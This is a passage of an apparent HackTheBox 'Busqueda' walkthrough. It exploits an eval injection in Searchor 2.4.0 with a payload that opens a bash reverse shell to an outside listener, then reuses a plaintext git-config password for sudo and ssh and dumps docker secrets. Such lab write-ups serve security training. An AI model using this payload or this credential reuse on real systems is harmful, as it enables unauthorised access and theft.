+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The following lines are desirable for IPv6 capable hosts
+</span></span><span class="line"><span class="cl">::1     ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">fe00::0 ip6-localnet
+</span></span><span class="line"><span class="cl">ff00::0 ip6-mcastprefix
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.208 searcher.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exploring-the-webpage">Exploring the webpage</h3>
+<p>Now upon vising the site, we see the website described as being able to search anything. We are given a wide selection of search engines to use, and then we can detail our search query as well:</p>
+<p><img src="/post/hackthebox-busqueda/Images/SearcherMenu.png"
+	width="1132"
+	height="532"
+	srcset="/post/hackthebox-busqueda/Images/SearcherMenu_huab1ccf5d0eceb0ed62ca714a1e410d31_89575_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/SearcherMenu_huab1ccf5d0eceb0ed62ca714a1e410d31_89575_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Website main page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<p>We also see the option to auto redirect, but at first glance I have no idea what that means.
+When I select the engine <code>Google</code> and something to search, pressing the <code>Search</code> button results in the generation of  a url that we might copy/paste into our browser.</p>
+<p><img src="/post/hackthebox-busqueda/Images/GoogleSearch.png"
+	width="517"
+	height="189"
+	srcset="/post/hackthebox-busqueda/Images/GoogleSearch_hudbcd43c277b4d51ff924adb6da68ed7b_13079_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/GoogleSearch_hudbcd43c277b4d51ff924adb6da68ed7b_13079_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Google Search Link"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="273"
+		data-flex-basis="656px"
+	
+></p>
+<p>This is how the search engine works: you supply the engine and the query, and the webpage will generate a link that can take you to a query using that search engine. Auto-redirect probably configures you to be taken directly to the link rather than this page showing nothing but the link text.</p>
+<p>Examining the bottom of the searcher page, we can see the web service is using Flask, and also that this searchor tool is open source:</p>
+<p><img src="/post/hackthebox-busqueda/Images/Footer.png"
+	width="816"
+	height="315"
+	srcset="/post/hackthebox-busqueda/Images/Footer_hub4926b183e24e17ef0fe544231413e6c_20532_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/Footer_hub4926b183e24e17ef0fe544231413e6c_20532_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Webpage footer"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="621px"
+	
+></p>
+<p>Clicking on the <code>Searchor 2.4.0</code> hyperlink redirects us to a <a class="link" href="https://github.com/ArjunSharda/Searchor"  target="_blank" rel="noopener"
+    >github page</a></p>
+<h3 id="enumerating-github-pull-requests-and-patch-histories">Enumerating github pull requests and patch histories</h3>
+<p>We can see from github that this is not the most recent version of searchor, so perhaps this version might have an unpatched vulnerability? For popular vulnerabilities, we can simply google search &ldquo;Service Version X.X.X exploit&rdquo; and get plenty of information. However, if Searchor is not big enough it might not get the same level of attention.
+In this case, it might be more fruitful to look at the version history for searchor, and see if there is any mention of patching an exploit.
+We can see in the overview for v2.4.2, there is a patched vulnerability mentioned</p>
+<p><img src="/post/hackthebox-busqueda/Images/v242.png"
+	width="1178"
+	height="342"
+	srcset="/post/hackthebox-busqueda/Images/v242_hud6e259cbc2990a0476d418c917c363ab_48084_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/v242_hud6e259cbc2990a0476d418c917c363ab_48084_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="V2.4.2 Vulnerability Patched"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="344"
+		data-flex-basis="826px"
+	
+></p>
+<p>Since the webpage is still using 2.4.0, this vulnerability should still exist, if we are able to take advantage.
+When we look at the link, the details say the <code>search</code> method in the code is utilizing an unsafe <code>eval</code> operation that can allow for arbitrary code execution.</p>
+<p><img src="/post/hackthebox-busqueda/Images/VulnDesc.png"
+	width="924"
+	height="331"
+	srcset="/post/hackthebox-busqueda/Images/VulnDesc_huc21fd84a6be7abb83ab26309c8bec8a6_80725_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/VulnDesc_huc21fd84a6be7abb83ab26309c8bec8a6_80725_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Description of vulnerability"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="669px"
+	
+></p>
+<p>To understand a little more, we can look at the code being changed in this pull request:</p>
+<p><img src="/post/hackthebox-busqueda/Images/searchorcode.png"
+	width="763"
+	height="533"
+	srcset="/post/hackthebox-busqueda/Images/searchorcode_hu2b69daee979c3c251f897ab564bfb544_92111_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/searchorcode_hu2b69daee979c3c251f897ab564bfb544_92111_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="change in code editing"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="343px"
+	
+></p>
+<p>We can see  here the two arguments we will provide the service, first being the <code>engine</code>, followed by <code>query</code>. It appears as though if we can escape the single quote wrapping around <code>query</code>, we might be able to directly call arguments in python&rsquo;s eval() statement.</p>
+<p>By editing the request in burpsuite, we can see when we supply a single <code>'</code> mark, the request breaks.</p>
+<p><img src="/post/hackthebox-busqueda/Images/singlequot.png"
+	width="885"
+	height="361"
+	srcset="/post/hackthebox-busqueda/Images/singlequot_hud4e4c08d5d6e32cb04f200c628597fd1_60692_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/singlequot_hud4e4c08d5d6e32cb04f200c628597fd1_60692_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Empty response"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="588px"
+	
+></p>
+<p>If we can supply new arguments in the proper syntax, we can achieve code execution.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="obtaining-shell-access-as-user-svc">Obtaining shell access as user svc</h3>
+<p>After a little bit of trial and error, I managed to achieve code execution:</p>
+<p><img src="/post/hackthebox-busqueda/Images/idexecution.png"
+	width="887"
+	height="366"
+	srcset="/post/hackthebox-busqueda/Images/idexecution_hu23e104e9f82b0b62436ea585ee1d0a1e_69916_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/idexecution_hu23e104e9f82b0b62436ea585ee1d0a1e_69916_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Executing id"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="581px"
+	
+></p>
+<p>In addition to the single quote, we also needed <code>)</code> to end the search function, followed by a <code>,</code> to supply a 2nd object to eval. <code>__import__('os').system()</code> is our set up for command execution, where we supply the shell command in system(). From here, a reverse shell can be obtained by searching for a bash rev shell payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">asdf&#39;),__import__(&#39;os&#39;).system(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.139/8888 0&gt;&amp;1&#34;&#39;) #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I found that this command had trouble executing from burpsuite, but has no issue if you simply return to the webpage and execute from your browser.
+On a listening session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.208] 36252
+</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1631): Inappropriate ioctl for device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">svc@busqueda:/var/www/app$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=1000(svc) gid=1000(svc) groups=1000(svc)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From here, we can grab the <code>user.txt</code> file.</p>
+<h3 id="enumerating-the-webservers-git-details">Enumerating the webserver&rsquo;s git details</h3>
+<p>When exploring the web file system, we see a <code>.git</code> folder in the web root directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:/var/www/app$ ls -al
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">total 20
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+</span></span><span class="line"><span class="cl">drwxr-xr-x 8 www-data www-data 4096 Aug 14 00:07 .git
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We know this service originally came from a public <code>git</code> repo, but it is a little surprising to see the iconic <code>.git</code> folder when file layout does not at all match with the git repo. When viewing Searchor 2.4.0, this is what the repo looks like:</p>
+<p><img src="/post/hackthebox-busqueda/Images/240_repo.png"
+	width="905"
+	height="662"
+	srcset="/post/hackthebox-busqueda/Images/240_repo_hu02f7e988c6f42f22d832b555c8631174_125018_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/240_repo_hu02f7e988c6f42f22d832b555c8631174_125018_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Searchor files"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="328px"
+	
+></p>
+<p>A lot of the files have been removed, changed, renamed, or other. However, exploring a little deeper, we can start to see what might be going on:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:/var/www/app/.git$ cat logs/HEAD
+</span></span><span class="line"><span class="cl">cat logs/HEAD
+</span></span><span class="line"><span class="cl">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000     commit (initial): Initial commit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When examining the current commit id, we can see the <code>.git</code> is not even associated with the github page Searchor. Instead, it looks like <code>administrator</code> built this webpage personally, utilizing Searchor 2.4.0 code, then created a new git repository with <code>Gitea</code> instead!  <a class="link" href="https://about.gitea.com/"  target="_blank" rel="noopener"
+    >Gitea is a git-based service that can be self-hosted</a>. Its purpose is similar to <a class="link" href="https://github.com/"  target="_blank" rel="noopener"
+    >Github</a>, but with the option for completely private hosting it allows for a much more isolated development workflow that might never leave a company&rsquo;s infrastructure.</p>
+<p>The new subdomain is particularly interesting, <code>gitea.searcher.htb</code>. Perhaps if we add this to our /etc/hosts file, we might view it ourselves?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ tail /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># The following lines are desirable for IPv6 capable hosts
+</span></span><span class="line"><span class="cl">::1     ip6-localhost ip6-loopback
+</span></span><span class="line"><span class="cl">fe00::0 ip6-localnet
+</span></span><span class="line"><span class="cl">ff00::0 ip6-mcastprefix
+</span></span><span class="line"><span class="cl">ff02::1 ip6-allnodes
+</span></span><span class="line"><span class="cl">ff02::2 ip6-allrouters
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">10.10.11.208 searcher.htb gitea.searcher.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Viewing the website:</p>
+<p><img src="/post/hackthebox-busqueda/Images/giteahome.png"
+	width="1190"
+	height="594"
+	srcset="/post/hackthebox-busqueda/Images/giteahome_huda5cf509fa99c844f89056c8771410d9_52781_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/giteahome_huda5cf509fa99c844f89056c8771410d9_52781_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Gitea home page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="480px"
+	
+></p>
+<p>Searching around, we can see users <code>administrator</code> and <code>cody</code>, but no repositories are publicly viewable.</p>
+<p><img src="/post/hackthebox-busqueda/Images/giteausers.png"
+	width="1221"
+	height="462"
+	srcset="/post/hackthebox-busqueda/Images/giteausers_hu04eab24b45dc20d6fcf4ab3c697cd71a_28097_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/giteausers_hu04eab24b45dc20d6fcf4ab3c697cd71a_28097_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Gitea Users"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="634px"
+	
+></p>
+<h3 id="finding-credentials-and-testing-for-password-re-use">Finding credentials and testing for password re-use</h3>
+<p>When looking back at the <code>.git/config</code> file, we can find credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:/var/www/app/.git$ cat config
+</span></span><span class="line"><span class="cl">cat config
+</span></span><span class="line"><span class="cl">[core]
+</span></span><span class="line"><span class="cl">        repositoryformatversion = 0
+</span></span><span class="line"><span class="cl">        filemode = true
+</span></span><span class="line"><span class="cl">        bare = false
+</span></span><span class="line"><span class="cl">        logallrefupdates = true
+</span></span><span class="line"><span class="cl">[remote &#34;origin&#34;]
+</span></span><span class="line"><span class="cl">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+</span></span><span class="line"><span class="cl">        fetch = +refs/heads/*:refs/remotes/origin/*
+</span></span><span class="line"><span class="cl">[branch &#34;main&#34;]
+</span></span><span class="line"><span class="cl">        remote = origin
+</span></span><span class="line"><span class="cl">        merge = refs/heads/main
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see in plaintext, cody&rsquo;s password of <code>jh1usoih2bkjaspwe92</code>. If there were a user named <code>cody</code> on the system, my first thought would be to check <code>su</code> to see if i can change my shell user to cody. However, only user <code>svc</code> exists on the box. Still, it might be that user svc was set up by cody, using the same password? It is worth a try, since it costs nothing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:/var/www/app/.git$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for svc: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries for svc on busqueda:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+</span></span><span class="line"><span class="cl">    use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User svc may run the following commands on busqueda:
+</span></span><span class="line"><span class="cl">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I used <code>sudo -l</code> to get the password check for <code>svc</code>, and not only did it work, but we also seem to have a sudo command we can run as root!
+Another check we might have done is to <code>ssh</code> in as <code>svc</code>. We can still do so, and now we know it will work:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh svc@searcher.htb
+</span></span><span class="line"><span class="cl">svc@searcher.htb&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">svc@busqueda:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Before forgetting about it, the password needs to be checked on the original service as well: the gitea page. It does indeed work, and there is one repository now viewable:</p>
+<p><img src="/post/hackthebox-busqueda/Images/SearcherRepo.png"
+	width="1165"
+	height="512"
+	srcset="/post/hackthebox-busqueda/Images/SearcherRepo_hu671587946e120cc4e9852fe376cd8f63_87458_480x0_resize_box_3.png 480w, /post/hackthebox-busqueda/Images/SearcherRepo_hu671587946e120cc4e9852fe376cd8f63_87458_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Logged in as cody"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<h3 id="enumerating-svcs-sudo-actions">Enumerating svc&rsquo;s sudo actions</h3>
+<p>Checking out the system-checkup script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ ls -al /opt/scripts/system-checkup.py 
+</span></span><span class="line"><span class="cl">-rwx--x--x 1 root root 1903 Dec 24  2022 /opt/scripts/system-checkup.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We cannot write over the file, so the exploit must come from abusing what the file does. Also, we cannot read the file, so we must figure out what is going on by running the script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span><span class="line"><span class="cl">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     docker-ps     : List running docker containers
+</span></span><span class="line"><span class="cl">     docker-inspect : Inpect a certain docker container
+</span></span><span class="line"><span class="cl">     full-checkup  : Run a full system checkup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It appears to be referencing docker containers running on the system. To start, let&rsquo;s check <code>docker-ps</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+</span></span><span class="line"><span class="cl">CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS        PORTS                                             NAMES
+</span></span><span class="line"><span class="cl">960873171e2e   gitea/gitea:latest   &#34;/usr/bin/entrypoint…&#34;   7 months ago   Up 15 hours   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+</span></span><span class="line"><span class="cl">f84a6b33fb5a   mysql:8              &#34;docker-entrypoint.s…&#34;   7 months ago   Up 15 hours   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see two containers, interestingly another gitea container? Or is this perhaps the same on we just looked at? I am not familiar enough with docker to know. Next, I try docker-inspect, and use the container ID of the gitea container, <code>960873171e2e</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 960873171e2e
+</span></span><span class="line"><span class="cl">Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I have no idea what format options are possible, so I have to read up on what this command can do. <code>docker-inspect</code> is a commonly conserved docker command, so <a class="link" href="https://docs.docker.com/engine/reference/commandline/inspect/"  target="_blank" rel="noopener"
+    >there is an entire webpage explaining it</a>. Looking at some examples, I&rsquo;m hoping I can specify something like this command to output all details:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker inspect --format=&#39;{{json .Config}}&#39; $INSTANCE_ID
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the command and beautifying the output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#39;{{json .Config}}&#39; 960873171e2e
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;Hostname&#34;: &#34;960873171e2e&#34;,
+</span></span><span class="line"><span class="cl">  &#34;Domainname&#34;: &#34;&#34;,
+</span></span><span class="line"><span class="cl">  &#34;User&#34;: &#34;&#34;,
+</span></span><span class="line"><span class="cl">  &#34;AttachStdin&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;AttachStdout&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;AttachStderr&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;ExposedPorts&#34;: {
+</span></span><span class="line"><span class="cl">    &#34;22/tcp&#34;: {},
+</span></span><span class="line"><span class="cl">    &#34;3000/tcp&#34;: {}
+</span></span><span class="line"><span class="cl">  },
+</span></span><span class="line"><span class="cl">  &#34;Tty&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;OpenStdin&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;StdinOnce&#34;: false,
+</span></span><span class="line"><span class="cl">  &#34;Env&#34;: [
+</span></span><span class="line"><span class="cl">    &#34;USER_UID=115&#34;,
+</span></span><span class="line"><span class="cl">    &#34;USER_GID=121&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA__database__DB_TYPE=mysql&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA__database__HOST=db:3306&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA__database__NAME=gitea&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA__database__USER=gitea&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;,
+</span></span><span class="line"><span class="cl">    &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
+</span></span><span class="line"><span class="cl">    &#34;USER=git&#34;,
+</span></span><span class="line"><span class="cl">    &#34;GITEA_CUSTOM=/data/gitea&#34;
+</span></span><span class="line"><span class="cl">  ],
+</span></span><span class="line"><span class="cl">  &#34;Cmd&#34;: [
+</span></span><span class="line"><span class="cl">    &#34;/bin/s6-svscan&#34;,
+</span></span><span class="line"><span class="cl">    &#34;/etc/s6&#34;
+</span></span><span class="line"><span class="cl">  ],
+</span></span><span class="line"><span class="cl">  &#34;Image&#34;: &#34;gitea/gitea:latest&#34;,
+</span></span><span class="line"><span class="cl">  &#34;Volumes&#34;: {
+</span></span><span class="line"><span class="cl">    &#34;/data&#34;: {},
+</span></span><span class="line"><span class="cl">    &#34;/etc/localtime&#34;: {},
+</span></span><span class="line"><span class="cl">    &#34;/etc/timezone&#34;: {}
+</span></span><span class="line"><span class="cl">  },
+</span></span><span class="line"><span class="cl">  &#34;WorkingDir&#34;: &#34;&#34;,
+</span></span><span class="line"><span class="cl">  &#34;Entrypoint&#34;: [
+</span></span><span class="line"><span class="cl">    &#34;/usr/bin/entrypoint&#34;
+</span></span><span class="line"><span class="cl">  ],
+</span></span><span class="line"><span class="cl">  &#34;OnBuild&#34;: null,
+</span></span><span class="line"><span class="cl">  &#34;Labels&#34;: {
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.config-hash&#34;: &#34;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.container-number&#34;: &#34;1&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.oneoff&#34;: &#34;False&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.project&#34;: &#34;docker&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.project.config_files&#34;: &#34;docker-compose.yml&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.project.working_dir&#34;: &#34;/root/scripts/docker&#34;,
+</span></span><span class="line"><span class="cl">    &#34;com.docker.compose.service&#34;: &#34;server&#34;,
